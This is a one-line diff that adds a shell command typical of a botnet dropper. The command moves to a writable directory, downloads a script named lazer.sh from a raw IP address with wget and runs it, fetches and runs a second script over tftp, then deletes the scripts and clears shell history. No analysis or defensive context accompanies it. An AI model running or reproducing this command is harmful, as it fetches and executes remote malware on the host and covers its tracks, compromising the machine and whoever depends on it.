@@ -1,0 +1,1 @@
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.144.178.146/lazer.sh; chmod 777 *; sh lazer.sh; tftp -g 45.144.178.146 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c
